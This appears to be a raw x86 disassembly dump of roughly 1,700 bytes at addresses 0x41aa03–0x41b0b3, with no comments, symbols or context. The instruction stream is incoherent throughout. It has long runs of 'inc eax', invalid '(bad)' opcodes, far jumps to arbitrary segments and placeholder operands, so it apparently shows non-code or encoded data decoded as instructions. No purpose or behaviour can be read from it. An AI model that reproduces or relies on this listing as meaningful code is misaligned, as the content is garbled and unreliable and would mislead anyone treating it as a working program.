  41aa03:	jns    0x41aa45
  41aa05:	inc    eax
  41aa06:	inc    eax
  41aa07:	inc    eax
  41aa08:	inc    eax
  41aa09:	inc    eax
  41aa0a:	int3   
  41aa0b:	jne    0x41aa4d
  41aa0d:	adc    al,0x51
  41aa0f:	and    al,0x43
  41aa11:	inc    ecx
  41aa12:	dec    esp
  41aa13:	jmp    0xa830:0xca436940
  41aa1a:	fadd   QWORD PTR [ebx+0x77]
  41aa1d:	add    DWORD PTR [edx-0x54],0xea4245e0
  41aa24:	sar    DWORD PTR [esi],cl
  41aa26:	push   ecx
  41aa27:	add    eax,0x40c10040
  41aa2c:	inc    eax
  41aa2d:	inc    eax
  41aa2e:	inc    eax
  41aa2f:	add    BYTE PTR [eax-0xc],al
  41aa32:	push   edx
  41aa33:	neg    BYTE PTR [edi]
  41aa35:	stc    
  41aa36:	sbb    edx,DWORD PTR [eax-0x79]
  41aa39:	test   al,0x52
  41aa3b:	dec    edi
  41aa3c:	stc    
  41aa3d:	adc    al,0x63
  41aa3f:	add    BYTE PTR [ebp+0x10],0x81
  41aa43:	inc    eax
  41aa44:	inc    eax
  41aa45:	inc    eax
  41aa46:	inc    eax
  41aa47:	inc    eax
  41aa48:	inc    eax
  41aa49:	inc    eax
  41aa4a:	inc    eax
  41aa4b:	inc    DWORD PTR [eax-0x48]
  41aa4e:	call   0x40c22bcc
  41aa53:	mov    eax,0x140515b4
  41aa58:	push   es
  41aa59:	inc    ecx
  41aa5a:	jl     0x41aa61
  41aa5c:	push   ebx
  41aa5d:	inc    ebx
  41aa5e:	inc    ecx
  41aa5f:	jg     0x41aa68
  41aa61:	inc    ecx
  41aa62:	inc    eax
  41aa63:	inc    eax
  41aa64:	inc    eax
  41aa65:	inc    eax
  41aa66:	inc    eax
  41aa67:	inc    eax
  41aa68:	inc    eax
  41aa69:	inc    eax
  41aa6a:	inc    eax
  41aa6b:	inc    eax
  41aa6c:	xor    al,0xcd
  41aa6e:	or     BYTE PTR [eax+0x48],0x14
  41aa72:	out    dx,eax
  41aa73:	inc    eax
  41aa74:	bound  edx,QWORD PTR [edx]
  41aa76:	rcl    BYTE PTR ds:0x40637ff0,1
  41aa7c:	test   eax,0xf8cb2442
  41aa81:	inc    edi
  41aa82:	xchg   DWORD PTR [eax-0x44],eax
  41aa85:	dec    ecx
  41aa86:	fsubr  DWORD PTR [esi+eiz*8+0x4040447f]
  41aa8d:	inc    eax
  41aa8e:	inc    eax
  41aa8f:	inc    eax
  41aa90:	inc    eax
  41aa91:	inc    eax
  41aa92:	inc    eax
  41aa93:	add    BYTE PTR [eax+0x9],al
  41aa96:	adc    al,0x62
  41aa98:	add    eax,0x508e5f15
  41aa9d:	ss int 0x31
  41aaa0:	leave  
  41aaa1:	dec    ebx
  41aaa2:	push   ss
  41aaa3:	xor    al,BYTE PTR [edx+0x73]
  41aaa6:	mov    ah,0xe4
  41aaa8:	dec    ecx
  41aaa9:	push   DWORD PTR [esi]
  41aaab:	pusha  
  41aaac:	inc    eax
  41aaad:	inc    eax
  41aaae:	inc    eax
  41aaaf:	inc    eax
  41aab0:	inc    eax
  41aab1:	inc    eax
  41aab2:	and    eax,0x84404040
  41aab7:	pushf  
  41aab8:	or     eax,0x7afa4263
  41aabd:	cmovno ecx,DWORD PTR [ecx-0x35]
  41aac1:	jp     0x41ab33
  41aac3:	in     al,0x53
  41aac5:	pop    eax
  41aac6:	inc    ecx
  41aac7:	sar    DWORD PTR [edi-0x58],cl
  41aaca:	ins    BYTE PTR es:[edi],dx
  41aacb:	or     eax,0xe14186b1
  41aad0:	dec    ebp
  41aad1:	inc    eax
  41aad2:	or     DWORD PTR [ebx+0x7e],0x4040406f
  41aad9:	inc    eax
  41aada:	inc    eax
  41aadb:	inc    eax
  41aadc:	inc    eax
  41aadd:	inc    eax
  41aade:	inc    eax
  41aadf:	inc    eax
  41aae0:	inc    ecx
  41aae1:	arpl   bx,cx
  41aae3:	sub    al,BYTE PTR [ebx-0x21]
  41aae6:	xchg   edx,eax
  41aae7:	jo     0x41ab49
  41aae9:	dec    edi
  41aaea:	mov    esp,0x40374abf
  41aaef:	inc    eax
  41aaf0:	inc    eax
  41aaf1:	inc    eax
  41aaf2:	inc    eax
  41aaf3:	inc    eax
  41aaf4:	rol    DWORD PTR [eax+0x40],0x35
  41aaf8:	les    esp,FWORD PTR [eax+0x8]
  41aafb:	pop    ebx
  41aafc:	sub    cl,BYTE PTR [ecx+edi*8-0x36]
  41ab00:	outs   dx,DWORD PTR ds:[esi]
  41ab01:	pusha  
  41ab02:	(bad)  
  41ab04:	dec    eax
  41ab05:	inc    eax
  41ab06:	inc    eax
  41ab07:	add    BYTE PTR [eax+0x40],al
  41ab0a:	inc    eax
  41ab0b:	inc    eax
  41ab0c:	inc    eax
  41ab0d:	inc    eax
  41ab0e:	not    BYTE PTR [eax+0x55609a95]
  41ab14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab15:	sub    cl,BYTE PTR [edi+0x5]
  41ab18:	add    ch,BYTE PTR [esp+edx*2+0x8]
  41ab1c:	xor    DWORD PTR [ebx],ebp
  41ab1e:	push   edx
  41ab1f:	inc    ecx
  41ab20:	push   ebx
  41ab21:	rcl    BYTE PTR [eax],0xdd
  41ab24:	test   al,0x36
  41ab26:	inc    esp
  41ab27:	jne    0x41ab2b
  41ab29:	jg     0x41ab3b
  41ab2b:	pop    ebx
  41ab2c:	adc    BYTE PTR [ebp+0x40],al
  41ab2f:	inc    eax
  41ab30:	inc    eax
  41ab31:	inc    eax
  41ab32:	inc    eax
  41ab33:	inc    eax
  41ab34:	inc    eax
  41ab35:	inc    eax
  41ab36:	inc    eax
  41ab37:	inc    eax
  41ab38:	inc    ebx
  41ab39:	xor    BYTE PTR ds:0x98081040,dh
  41ab3f:	dec    eax
  41ab40:	lods   al,BYTE PTR ds:[esi]
  41ab41:	mov    ?,edi
  41ab43:	xor    edx,DWORD PTR [eax]
  41ab45:	fld    QWORD PTR ds:0x7c1542b2
  41ab4b:	retf   
  41ab4c:	push   eax
  41ab4d:	sub    ebx,ecx
  41ab4f:	hlt    
  41ab50:	inc    esp
  41ab51:	inc    ecx
  41ab52:	xor    ecx,eax
  41ab54:	push   eax
  41ab55:	mov    WORD PTR [eax],fs
  41ab57:	(bad)  
  41ab58:	mul    dl
  41ab5a:	popa   
  41ab5b:	inc    eax
  41ab5c:	inc    eax
  41ab5d:	inc    eax
  41ab5e:	inc    eax
  41ab5f:	inc    eax
  41ab60:	inc    eax
  41ab61:	int3   
  41ab62:	jne    0x41aba4
  41ab64:	stc    
  41ab65:	push   eax
  41ab66:	push   ss
  41ab67:	inc    ebp
  41ab68:	clc    
  41ab69:	dec    edi
  41ab6a:	cli    
  41ab6b:	xchg   ecx,eax
  41ab6c:	rcl    DWORD PTR [eax+0x78],0xb1
  41ab70:	pop    esi
  41ab71:	inc    ecx
  41ab72:	mov    WORD PTR [ecx],?
  41ab74:	dec    ecx
  41ab75:	mov    al,0xac
  41ab77:	sub    BYTE PTR ds:0xc0190d40,dl
  41ab7d:	inc    ebx
  41ab7e:	inc    ebp
  41ab7f:	pop    ds
  41ab80:	push   edx
  41ab81:	xchg   esp,eax
  41ab82:	dec    ebx
  41ab83:	inc    eax
  41ab84:	add    cl,al
  41ab86:	inc    eax
  41ab87:	inc    eax
  41ab88:	inc    eax
  41ab89:	inc    eax
  41ab8a:	add    BYTE PTR [eax+0x55],al
  41ab8d:	sub    esp,edi
  41ab8f:	aas    
  41ab90:	je     0x41abb0
  41ab92:	addr16 repz mov bh,0xce
  41ab96:	inc    ecx
  41ab97:	arpl   WORD PTR fs:[eax-0x749c06b8],bp
  41ab9e:	mov    eax,cs
  41aba0:	push   ecx
  41aba1:	aam    0x54
  41aba3:	mov    dh,BYTE PTR [eax]
  41aba5:	rol    DWORD PTR [ebx-0x3b],0xa8
  41aba9:	xchg   BYTE PTR [eax+0x40],al
  41abac:	inc    eax
  41abad:	inc    eax
  41abae:	inc    eax
  41abaf:	inc    eax
  41abb0:	inc    eax
  41abb1:	inc    eax
  41abb2:	inc    DWORD PTR [eax-0x38]
  41abb5:	add    eax,0xe8954132
  41abba:	adc    ah,BYTE PTR [eax-0x43]
  41abbd:	dec    ebp
  41abbe:	or     eax,eax
  41abc0:	inc    ebx
  41abc1:	dec    ecx
  41abc2:	sar    BYTE PTR [ecx+0x15],1
  41abc5:	inc    eax
  41abc6:	inc    eax
  41abc7:	inc    eax
  41abc8:	inc    eax
  41abc9:	inc    eax
  41abca:	inc    eax
  41abcb:	inc    eax
  41abcc:	inc    eax
  41abcd:	inc    eax
  41abce:	inc    eax
  41abcf:	out    dx,eax
  41abd0:	push   ecx
  41abd1:	xor    eax,0xdd15d444
  41abd6:	retf   0x76f8
  41abd9:	inc    esi
  41abda:	inc    ecx
  41abdb:	test   ch,0x7a
  41abde:	inc    ebx
  41abdf:	mov    BYTE PTR [esi-0x40],dh
  41abe2:	inc    ebx
  41abe3:	cmp    al,0x11
  41abe5:	and    BYTE PTR [eax+0x15],al
  41abe8:	mov    ebx,0x98624160
  41abed:	pop    es
  41abee:	sbb    al,0x4d
  41abf0:	or     al,0x40
  41abf2:	inc    eax
  41abf3:	inc    eax
  41abf4:	inc    eax
  41abf5:	inc    eax
  41abf6:	inc    eax
  41abf7:	inc    eax
  41abf8:	inc    eax
  41abf9:	add    BYTE PTR [edx-0x21],bl
  41abfc:	ror    DWORD PTR ds:0x19fb67ec,1
  41ac02:	rcr    DWORD PTR [ecx],0x45
  41ac05:	int    0x6f
  41ac07:	push   esi
  41ac08:	cli    
  41ac09:	not    DWORD PTR [ebp+0x19]
  41ac0c:	xchg   ebp,eax
  41ac0d:	inc    eax
  41ac0e:	inc    eax
  41ac0f:	inc    eax
  41ac10:	inc    eax
  41ac11:	inc    eax
  41ac12:	inc    eax
  41ac13:	and    eax,0x47404040
  41ac18:	inc    edi
  41ac19:	inc    esp
  41ac1a:	xchg   BYTE PTR [ecx-0x3e],al
  41ac1d:	sbb    DWORD PTR [ecx],ecx
  41ac1f:	pop    ss
  41ac20:	xor    al,cl
  41ac22:	or     eax,0x5119b37f
  41ac27:	push   eax
  41ac28:	ins    BYTE PTR es:[edi],dx
  41ac29:	dec    eax
  41ac2a:	dec    esi
  41ac2b:	inc    eax
  41ac2c:	inc    eax
  41ac2d:	inc    eax
  41ac2e:	inc    eax
  41ac2f:	inc    eax
  41ac30:	inc    eax
  41ac31:	inc    eax
  41ac32:	inc    eax
  41ac33:	inc    eax
  41ac34:	inc    eax
  41ac35:	dec    eax
  41ac36:	xchg   esi,eax
  41ac37:	sbb    DWORD PTR [ebp-0x18bbdb9b],ecx
  41ac3d:	mov    edi,0x535d1940
  41ac42:	add    dl,cl
  41ac44:	stc    
  41ac45:	or     esi,DWORD PTR [ebx]
  41ac47:	sbb    DWORD PTR [ecx+0x28],ebp
  41ac4a:	dec    ecx
  41ac4b:	inc    eax
  41ac4c:	inc    eax
  41ac4d:	inc    eax
  41ac4e:	inc    eax
  41ac4f:	inc    eax
  41ac50:	inc    eax
  41ac51:	rol    DWORD PTR [eax+0x40],0x76
  41ac55:	test   bh,bh
  41ac57:	sub    bl,BYTE PTR [ecx]
  41ac59:	xchg   ecx,eax
  41ac5a:	cwde   
  41ac5b:	sub    cl,bl
  41ac5d:	add    eax,0x5d19c40b
  41ac62:	add    eax,0xff4e5026
  41ac67:	test   eax,0xa8873c19
  41ac6c:	xor    eax,0x193444f3
  41ac71:	inc    ebx
  41ac72:	call   0xb13a7789
  41ac77:	shl    BYTE PTR [eax],0x40
  41ac7a:	inc    eax
  41ac7b:	add    BYTE PTR [eax+0x40],al
  41ac7e:	inc    eax
  41ac7f:	inc    eax
  41ac80:	inc    eax
  41ac81:	inc    eax
  41ac82:	test   BYTE PTR ds:0x2f82bfcb,al
  41ac88:	adc    DWORD PTR [eax],esp
  41ac8a:	push   0x1515fbc9
  41ac8f:	ds inc eax
  41ac91:	jecxz  0x41acd6
  41ac93:	bound  ecx,QWORD PTR es:[edx+0x7c]
  41ac97:	cmp    edi,edi
  41ac99:	sar    BYTE PTR [eax],cl
  41ac9b:	inc    eax
  41ac9c:	inc    eax
  41ac9d:	inc    eax
  41ac9e:	inc    eax
  41ac9f:	inc    eax
  41aca0:	inc    eax
  41aca1:	inc    eax
  41aca2:	inc    eax
  41aca3:	inc    eax
  41aca4:	inc    eax
  41aca5:	xor    BYTE PTR [edi+0x47],0x97
  41aca9:	jae    0x41ad13
  41acab:	sbb    ecx,esp
  41acad:	jae    0x41ac97
  41acaf:	add    BYTE PTR [eax+0x40405a55],0x40
  41acb6:	inc    eax
  41acb7:	inc    eax
  41acb8:	inc    eax
  41acb9:	int3   
  41acba:	jne    0x41acfc
  41acbc:	lds    edi,FWORD PTR [edi+0xdbe62e6]
  41acc2:	xor    ecx,eax
  41acc4:	sbb    DWORD PTR [edi+0x7d0dbf15],edi
  41acca:	inc    edx
  41accb:	inc    edi
  41accc:	sbb    DWORD PTR [esi-0x7d09f2b8],edi
  41acd2:	push   eax
  41acd3:	rcr    dh,0xff
  41acd6:	inc    ebp
  41acd7:	inc    eax
  41acd8:	add    cl,al
  41acda:	inc    eax
  41acdb:	inc    eax
  41acdc:	inc    eax
  41acdd:	inc    eax
  41acde:	add    BYTE PTR [eax-0x33],al
  41ace1:	dec    edi
  41ace2:	(bad)  
  41ace3:	xor    esi,DWORD PTR [ecx+eiz*1]
  41ace6:	test   al,0xf0
  41ace8:	popa   
  41ace9:	mov    ebp,0xd4984205
  41acee:	inc    ebx
  41acef:	cli    
  41acf0:	xor    eax,0xc3315e05
  41acf5:	and    DWORD PTR [ebp-0x1c],eax
  41acf8:	inc    edx
  41acf9:	enter  0x4040,0x40
  41acfd:	inc    eax
  41acfe:	inc    eax
  41acff:	inc    eax
  41ad00:	inc    eax
  41ad01:	inc    eax
  41ad02:	inc    DWORD PTR [eax-0x16]
  41ad05:	xor    eax,DWORD PTR [eax+0x19]
  41ad08:	lock or eax,0x7bf84216
  41ad0e:	rcr    BYTE PTR [ecx],0x37
  41ad11:	dec    eax
  41ad12:	mov    esp,0x333dfc44
  41ad17:	sbb    DWORD PTR [eax+0x15ca62ff],ebp
  41ad1d:	cmc    
  41ad1e:	sbb    bl,BYTE PTR [ecx]
  41ad20:	adc    bh,cl
  41ad22:	popa   
  41ad23:	push   ecx
  41ad24:	dec    ebx
  41ad25:	cmp    eax,0x404040c0
  41ad2a:	inc    eax
  41ad2b:	inc    eax
  41ad2c:	inc    eax
  41ad2d:	inc    eax
  41ad2e:	inc    eax
  41ad2f:	inc    eax
  41ad30:	inc    eax
  41ad31:	adc    BYTE PTR [edi-0x1e],ch
  41ad34:	ror    BYTE PTR [eax-0x2d],1
  41ad37:	jmp    FWORD PTR [eax+edx*1]
  41ad3a:	ret    
  41ad3b:	add    eax,0xaf3500aa
  41ad40:	call   0x441c:0x2041cb10
  41ad47:	dec    ebp
  41ad48:	pop    esi
  41ad49:	inc    eax
  41ad4a:	inc    eax
  41ad4b:	inc    eax
  41ad4c:	inc    eax
  41ad4d:	inc    eax
  41ad4e:	inc    eax
  41ad4f:	inc    eax
  41ad50:	inc    eax
  41ad51:	add    BYTE PTR [eax],dl
  41ad53:	push   esp
  41ad54:	ret    
  41ad55:	mov    dh,0x62
  41ad57:	and    DWORD PTR [ebx-0x40],esi
  41ad5a:	sbb    DWORD PTR [ebx+0x48483601],ebp
  41ad60:	xor    ah,BYTE PTR [eax+0x3d]
  41ad63:	add    al,bh
  41ad65:	bound  esp,QWORD PTR [ecx*8+0x2fc8e857]
  41ad6c:	loopne 0x41ada9
  41ad6e:	inc    eax
  41ad6f:	leave  
  41ad70:	ins    DWORD PTR es:[edi],dx
  41ad71:	inc    eax
  41ad72:	inc    eax
  41ad73:	inc    eax
  41ad74:	inc    eax
  41ad75:	inc    eax
  41ad76:	inc    eax
  41ad77:	and    eax,0xc5404040
  41ad7c:	fidivr DWORD PTR [ebp+edx*1+0x54]
  41ad80:	mov    ebp,0x19427226
  41ad85:	sub    al,0x41
  41ad87:	bound  eax,QWORD PTR ds:0x19c07489
  41ad8d:	inc    ebp
  41ad8e:	inc    ecx
  41ad8f:	stos   BYTE PTR es:[edi],al
  41ad90:	xchg   BYTE PTR [edx+0x40],al
  41ad93:	jle    0x41adae
  41ad95:	xchg   eax,eax
  41ad97:	lds    eax,FWORD PTR [eax+0x40]
  41ad9a:	inc    eax
  41ad9b:	inc    eax
  41ad9c:	inc    eax
  41ad9d:	inc    eax
  41ad9e:	inc    eax
  41ad9f:	inc    eax
  41ada0:	inc    eax
  41ada1:	inc    eax
  41ada2:	mov    esi,0x195d5169
  41ada7:	dec    esp
  41ada8:	push   cs
  41ada9:	dec    edi
  41adaa:	or     eax,0x19c04824
  41adaf:	xor    eax,0x46c892fa
  41adb4:	pop    edi
  41adb5:	jl     0x41adf7
  41adb7:	inc    eax
  41adb8:	inc    eax
  41adb9:	inc    eax
  41adba:	inc    eax
  41adbb:	inc    eax
  41adbc:	rol    DWORD PTR [eax+0x40],0x19
  41adc0:	inc    ecx
  41adc1:	faddp  st(5),st
  41adc3:	add    ebp,eax
  41adc5:	add    eax,0xd501940
  41adca:	inc    edx
  41adcb:	inc    ebp
  41adcc:	push   ebx
  41adcd:	mov    cl,0xc3
  41adcf:	sbb    DWORD PTR [eax],esi
  41add1:	inc    ecx
  41add2:	js     0x41ae18
  41add4:	inc    eax
  41add5:	inc    eax
  41add6:	add    BYTE PTR [eax+0x40],al
  41add9:	inc    eax
  41adda:	inc    eax
  41addb:	inc    eax
  41addc:	inc    eax
  41addd:	loop   0x41adf1
  41addf:	cmc    
  41ade0:	sbb    DWORD PTR [ebp+0x41],ecx
  41ade3:	add    al,0x34
  41ade5:	ins    BYTE PTR es:[edi],dx
  41ade6:	jae    0x41ae41
  41ade8:	sbb    DWORD PTR [ebx+0x40],edi
  41adeb:	inc    eax
  41adec:	inc    eax
  41aded:	inc    eax
  41adee:	inc    eax
  41adef:	inc    eax
  41adf0:	inc    eax
  41adf1:	inc    eax
  41adf2:	inc    eax
  41adf3:	inc    eax
  41adf4:	rcl    BYTE PTR [ebx-0x77],0x24
  41adf8:	scas   eax,DWORD PTR es:[edi]
  41adf9:	rcr    BYTE PTR [ecx],0xb8
  41adfc:	adc    cl,BYTE PTR [ebp-0x3f]
  41adff:	inc    esp
  41ae00:	push   es
  41ae01:	inc    eax
  41ae02:	inc    eax
  41ae03:	inc    eax
  41ae04:	inc    eax
  41ae05:	inc    eax
  41ae06:	inc    eax
  41ae07:	int3   
  41ae08:	jne    0x41ae4a
  41ae0a:	dec    edx
  41ae0b:	sbb    DWORD PTR ds:0x440938f9,ecx
  41ae11:	aas    
  41ae12:	inc    eax
  41ae13:	aas    
  41ae14:	inc    ecx
  41ae15:	fdiv   st(1),st
  41ae17:	dec    eax
  41ae18:	mov    ch,0x64
  41ae1a:	dec    ebp
  41ae1b:	aas    
  41ae1c:	sahf   
  41ae1d:	add    eax,0xb1694162
  41ae22:	inc    eax
  41ae23:	add    cl,al
  41ae25:	inc    eax
  41ae26:	inc    eax
  41ae27:	inc    eax
  41ae28:	inc    eax
  41ae29:	add    BYTE PTR [eax+0x40],al
  41ae2c:	cmp    eax,0x44794190
  41ae31:	inc    edx
  41ae32:	jb     0x41aeb2
  41ae34:	and    BYTE PTR [edx+0x41],ah
  41ae37:	ret    
  41ae38:	ror    ch,1
  41ae3a:	xor    eax,0xc03b1981
  41ae3f:	mov    ah,0xa1
  41ae41:	dec    ebx
  41ae42:	jb     0x41ae04
  41ae44:	sbb    DWORD PTR [ecx-0x13e7bfb],ebp
  41ae4a:	aas    
  41ae4b:	jnp    0x41ae8d
  41ae4d:	inc    eax
  41ae4e:	inc    eax
  41ae4f:	inc    eax
  41ae50:	inc    eax
  41ae51:	inc    eax
  41ae52:	inc    eax
  41ae53:	inc    eax
  41ae54:	inc    DWORD PTR [eax+0x3f]
  41ae57:	inc    ebp
  41ae58:	clc    
  41ae59:	xchg   ebx,eax
  41ae5a:	mov    ah,BYTE PTR [ebx+0x47]
  41ae5d:	ret    0xab19
  41ae60:	fisubr DWORD PTR [ebx+eax*2+0x19411130]
  41ae67:	inc    ecx
  41ae68:	adc    eax,0x2440be05
  41ae6d:	lds    ebx,FWORD PTR [ecx]
  41ae6f:	add    al,0x41
  41ae71:	push   edx
  41ae72:	adc    eax,0x19ddd3c5
  41ae77:	inc    eax
  41ae78:	inc    eax
  41ae79:	inc    eax
  41ae7a:	inc    eax
  41ae7b:	inc    eax
  41ae7c:	inc    eax
  41ae7d:	inc    eax
  41ae7e:	inc    eax
  41ae7f:	inc    eax
  41ae80:	inc    eax
  41ae81:	in     al,dx
  41ae82:	inc    ecx
  41ae83:	xor    dh,dh
  41ae85:	push   ebx
  41ae86:	dec    eax
  41ae87:	rcr    BYTE PTR [ecx],0xe4
  41ae8a:	rcl    BYTE PTR [edx+0x4f],0xe2
  41ae8e:	adc    al,BYTE PTR [edx]
  41ae90:	xlat   BYTE PTR ds:[ebx]
  41ae91:	adc    edx,DWORD PTR [edx+eiz*2]
  41ae94:	dec    eax
  41ae95:	inc    esp
  41ae96:	and    cl,BYTE PTR [ecx]
  41ae98:	cmp    eax,0x40404040
  41ae9d:	inc    eax
  41ae9e:	inc    eax
  41ae9f:	inc    eax
  41aea0:	inc    eax
  41aea1:	add    ch,cl
  41aea3:	cli    
  41aea4:	stos   DWORD PTR es:[edi],eax
  41aea5:	dec    esp
  41aea6:	sub    al,0xbe
  41aea8:	rol    edx,0x4e
  41aeab:	fcom   DWORD PTR [ecx+0x4824bef6]
  41aeb1:	shl    BYTE PTR ds:0xd54fbf0d,1
  41aeb7:	cmc    
  41aeb8:	rol    DWORD PTR [ecx-0x80],0x41
  41aebc:	dec    eax
  41aebd:	inc    edx
  41aebe:	imul   eax,DWORD PTR [ebx+0x5f],0x4241c541
  41aec5:	retf   
  41aec6:	out    0x40,al
  41aec8:	inc    eax
  41aec9:	inc    eax
  41aeca:	inc    eax
  41aecb:	inc    eax
  41aecc:	inc    eax
  41aecd:	and    eax,0x71404040
  41aed2:	ret    0x417f
  41aed5:	rol    BYTE PTR [eax+edx*2+0x44],0x6a
  41aeda:	and    eax,DWORD PTR [ecx+0x23]
  41aedd:	adc    eax,0x40401520
  41aee2:	inc    eax
  41aee3:	inc    eax
  41aee4:	inc    eax
  41aee5:	inc    eax
  41aee6:	inc    eax
  41aee7:	inc    eax
  41aee8:	inc    eax
  41aee9:	inc    eax
  41aeea:	sub    al,0x75
  41aeec:	gs aas 
  41aeee:	call   0xbd0da0ec
  41aef3:	dec    eax
  41aef4:	aam    0x41
  41aef6:	fs (bad) 
  41aef8:	test   al,0xbf
  41aefa:	int    0xf1
  41aefc:	popf   
  41aefd:	aas    
  41aefe:	test   BYTE PTR ds:0x40690d47,al
  41af04:	inc    eax
  41af05:	inc    eax
  41af06:	inc    eax
  41af07:	inc    eax
  41af08:	inc    eax
  41af09:	rol    DWORD PTR [eax+0x40],0x4b
  41af0d:	jne    0x41af60
  41af0f:	test   al,0x41
  41af11:	ds mul dh
  41af14:	jb     0x41af1f
  41af16:	aas    
  41af17:	adc    al,BYTE PTR [ecx+0x61]
  41af1a:	dec    edi
  41af1b:	inc    esp
  41af1c:	or     ecx,ecx
  41af1e:	inc    ebx
  41af1f:	mov    esp,0x4040d4c0
  41af24:	add    BYTE PTR [eax+0x40],al
  41af27:	inc    eax
  41af28:	inc    eax
  41af29:	inc    eax
  41af2a:	inc    eax
  41af2b:	mov    edi,0xff53072c
  41af30:	inc    ecx
  41af31:	adc    BYTE PTR [esi-0x2f8e45fb],dh
  41af37:	jmp    0x40c5:0xc8e8f899
  41af3e:	and    al,0xec
  41af40:	test   al,0xd4
  41af42:	bound  eax,QWORD PTR [eax]
  41af44:	inc    ecx
  41af45:	push   ecx
  41af46:	and    dl,ch
  41af48:	bound  edx,QWORD PTR ds:0x40404040
  41af4e:	inc    eax
  41af4f:	inc    eax
  41af50:	inc    eax
  41af51:	inc    eax
  41af52:	inc    eax
  41af53:	inc    eax
  41af54:	xchg   edx,eax
  41af55:	inc    edi
  41af56:	into   
  41af57:	mov    ebx,0x41c9eac2
  41af5c:	lds    eax,FWORD PTR [eax+0x29]
  41af5f:	dec    ebp
  41af60:	das    
  41af61:	fmul   QWORD PTR [eax+0x41]
  41af64:	fist   DWORD PTR [esi+0x44]
  41af67:	pop    ds
  41af68:	inc    ebp
  41af69:	add    DWORD PTR [eax+0x40],0x40
  41af6d:	inc    eax
  41af6e:	inc    eax
  41af6f:	inc    eax
  41af70:	int3   
  41af71:	jne    0x41afb3
  41af73:	or     al,al
  41af75:	dec    BYTE PTR [eax+0x2d]
  41af78:	add    eax,0xd43dfc0
  41af7d:	bound  edx,QWORD PTR [edx-0x48]
  41af80:	xor    DWORD PTR [edx-0x1d],edi
  41af83:	mov    eax,0xd54d4ffa
  41af88:	dec    edi
  41af89:	sub    ah,bl
  41af8b:	or     eax,0x420843d2
  41af90:	sub    esp,eax
  41af92:	test   DWORD PTR [ebx+0xd],eax
  41af95:	lds    eax,FWORD PTR [eax+0x0]
  41af98:	rol    DWORD PTR [eax+0x40],0x40
  41af9c:	inc    eax
  41af9d:	add    BYTE PTR [eax+0x47],al
  41afa0:	ficom  WORD PTR [esi]
  41afa2:	shl    ebx,0x48
  41afa5:	inc    ecx
  41afa6:	and    al,0x39
  41afa8:	xor    BYTE PTR [ecx+0x4184fd33],ah
  41afae:	or     BYTE PTR [eax+0x40],al
  41afb1:	inc    eax
  41afb2:	inc    eax
  41afb3:	inc    eax
  41afb4:	inc    eax
  41afb5:	inc    eax
  41afb6:	inc    eax
  41afb7:	inc    DWORD PTR [eax-0x40]
  41afba:	inc    esp
  41afbb:	adc    al,al
  41afbd:	xchg   esi,eax
  41afbe:	push   ebx
  41afbf:	rol    BYTE PTR [ebx+0x40],0x2d
  41afc3:	mov    eax,ds:0xf11ee34
  41afc8:	xor    al,BYTE PTR [eax-0x4a]
  41afcb:	inc    esi
  41afcc:	and    esi,edi
  41afce:	cs stc 
  41afd0:	xchg   edx,eax
  41afd1:	mov    edi,0xd6c16140
  41afd6:	in     eax,dx
  41afd7:	shl    BYTE PTR [ebx+0x65],1
  41afda:	inc    eax
  41afdb:	inc    eax
  41afdc:	inc    eax
  41afdd:	inc    eax
  41afde:	inc    eax
  41afdf:	inc    eax
  41afe0:	inc    eax
  41afe1:	inc    eax
  41afe2:	inc    eax
  41afe3:	inc    eax
  41afe4:	int    0x15
  41afe6:	inc    edx
  41afe7:	(bad)  
  41afe8:	bound  eax,QWORD PTR ds:0xe1694139
  41afee:	rol    BYTE PTR [ebx-0x7f9e36c0],0xb4
  41aff5:	dec    esi
  41aff6:	and    eax,0xd4262083
  41affb:	ret    
  41affc:	dec    ebp
  41affd:	loope  0x41b04c
  41afff:	inc    eax
  41b000:	inc    eax
  41b001:	inc    eax
  41b002:	inc    eax
  41b003:	inc    eax
  41b004:	inc    eax
  41b005:	inc    eax
  41b006:	inc    eax
  41b007:	add    dl,ch
  41b009:	addr16 inc eax
  41b00b:	adc    bh,BYTE PTR [edi-0x173f401f]
  41b011:	gs inc eax
  41b013:	mov    edi,0x32603605
  41b018:	jmp    0x5948:0xf6154043
  41b01f:	call   0x314f:0xcd0381d6
  41b026:	inc    eax
  41b027:	pop    esp
  41b028:	jmp    0x4040:0x4040409d
  41b02f:	inc    eax
  41b030:	and    eax,0xf8404040
  41b035:	imul   ecx,DWORD PTR [ebp-0x4e],0x78fac02c
  41b03c:	dec    eax
  41b03d:	xor    eax,0x220cd562
  41b042:	jmp    0x6347:0xb8435663
  41b049:	jg     0x41b035
  41b04b:	dec    eax
  41b04c:	nop
  41b04d:	outs   dx,BYTE PTR ds:[esi]
  41b04e:	(bad)  
  41b050:	dec    ecx
  41b051:	inc    eax
  41b052:	inc    eax
  41b053:	inc    eax
  41b054:	inc    eax
  41b055:	inc    eax
  41b056:	inc    eax
  41b057:	inc    eax
  41b058:	inc    eax
  41b059:	inc    eax
  41b05a:	inc    eax
  41b05b:	int3   
  41b05c:	in     al,0x81
  41b05e:	xchg   ecx,eax
  41b05f:	mov    bl,al
  41b061:	inc    esp
  41b062:	and    DWORD PTR [edi],esp
  41b064:	jecxz  0x41b029
  41b066:	aam    0x62
  41b068:	dec    edi
  41b069:	and    BYTE PTR [ebp+0x23],dl
  41b06c:	jecxz  0x41b0ae
  41b06e:	inc    eax
  41b06f:	inc    eax
  41b070:	inc    eax
  41b071:	inc    eax
  41b072:	inc    eax
  41b073:	rol    DWORD PTR [eax+0x40],0xf1
  41b077:	push   ebx
  41b078:	pusha  
  41b079:	dec    esp
  41b07a:	mov    al,0xe1
  41b07c:	inc    ecx
  41b07d:	cmc    
  41b07e:	aas    
  41b07f:	cmp    al,0xc8
  41b081:	adc    eax,0xdf414ccd
  41b086:	inc    eax
  41b087:	inc    eax
  41b088:	add    BYTE PTR [eax+0x40],al
  41b08b:	inc    eax
  41b08c:	inc    eax
  41b08d:	inc    eax
  41b08e:	inc    eax
  41b08f:	rol    BYTE PTR [edi+0x62],cl
  41b092:	jnp    0x41b0df
  41b094:	mov    eax,ds:0xaedcdf40
  41b099:	push   0x42
  41b09b:	repnz dec edi
  41b09d:	and    al,0xdf
  41b09f:	jle    0x41b04a
  41b0a1:	mov    al,ds:0x67424435
  41b0a6:	fild   QWORD PTR [eax+0x40404090]
  41b0ac:	inc    eax
  41b0ad:	inc    eax
  41b0ae:	inc    eax
  41b0af:	inc    eax
  41b0b0:	inc    eax
  41b0b1:	inc    eax
  41b0b2:	inc    eax
  41b0b3:	bound  esp,QWORD PTR [eax+eiz*1+0x10ea40a2]
